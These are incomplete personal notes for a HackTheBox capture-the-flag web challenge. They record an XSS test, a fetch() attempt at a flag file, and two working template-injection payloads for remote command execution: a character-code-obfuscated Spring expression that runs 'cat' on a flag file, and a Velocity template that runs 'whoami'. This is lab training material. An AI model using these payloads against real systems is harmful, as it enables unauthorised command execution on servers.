# Labyrinth-Linguist

## FLAG: HTB{}

## Status: Incomplete

+ DOCKER: Yes
+ DOWNLOADABLE: Yes

Description: You and your faction find yourselves cornered in a refuge corridor inside a maze while being chased by a KORP mutant exterminator. While planning your next move you come across a translator device left by previous Fray competitors, it is used for translating english to voxalith, an ancient language spoken by the civilization that originally built the maze. It is known that voxalith was also spoken by the guardians of the maze that were once benign but then were turned against humans by a corrupting agent KORP devised. You need to reverse engineer the device in order to make contact with the mutant and claim your last chance to make it out alive.

## NOTES

1. Spawn Docker
   1. IP: 94.237.49.14
   2. PORT: 32361
2. Extract files
   1. > unzip web_labyrinth_linguist.zip
3. HTTP
   1. Navigate to website and inspect
   2. Here we have an input form that looks to translate from english to voxalith
   3. TEST
      1. Lets try sending through hello world
         1. Inspecting the code we see
            1. <h2 class="fire">hello world</h2>
            2. So maybe we can abuse XSS and inject our own script
      2. XSS Test
         1. Input <script>alert(1);</script>
         2. Submit -> success we get an alert popup, so now how do we get the flag from here
4. Examine Code
   1. Looking at the file structure and code we see that the flag is up two directories
   2. But we also see that the code is build on JAVA so maybe we can do some java template injection
5. EXPLOIT
   1. So lets try and use the fetch() function in javascript to get the flag

```js
fetch('../../flag.txt')
    .then(function (response) {
    return response.text();
    })
    .then(function (json) {
    console.log(json);
    });
```


Spring
```js
    ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(102)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(103)).concat(T(java.lang.Character).toString(46)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(120)).concat(T(java.lang.Character).toString(116))).getInputStream())}
```

Velocity
```js
    #set($str=$class.inspect("java.lang.String").type)
    #set($chr=$class.inspect("java.lang.Character").type)
    #set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
    #set($out=$ex.getInputStream())
    #foreach($i in [1..$out.available()])
    $str.valueOf($chr.toChars($out.read()))
    #end
```